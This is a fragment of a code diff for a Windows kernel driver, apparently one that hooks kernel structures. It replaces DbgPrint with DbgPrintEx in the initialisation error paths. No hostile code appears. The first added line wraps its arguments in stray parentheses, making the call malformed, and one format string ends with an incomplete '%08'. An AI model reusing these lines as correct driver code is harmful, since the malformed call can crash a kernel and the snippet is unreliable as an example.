+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,("Failed to create symbolic link (0x%08X)\n", status));
         IoDeleteDevice(driverObject->DeviceObject);
         return (STATUS_UNSUCCESSFUL);
     }
 
     if (InitializeOffsets(&xHooklist))
     {
-        DbgPrint("Unsupported Windows build !\n");
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Unsupported Windows build !\n");
         //unloadv(driverObject);
         //return (STATUS_UNSUCCESSFUL);
     }
     else
     {
-        DbgPrint("Offsets initialized\n");
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Offsets initialized\n");
     }
 
     if (!NT_SUCCESS(status = IoRegisterShutdownNotification(driverObject->DeviceObject)))
     {
-        DbgPrint("Failed to register the shutdown notification callback (0x%08) \n", status);
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,"Failed to register the shutdown notification callback (0x%08) \n", status);
         unloadv(driverObject);
         return (STATUS_UNSUCCESSFUL);
     }
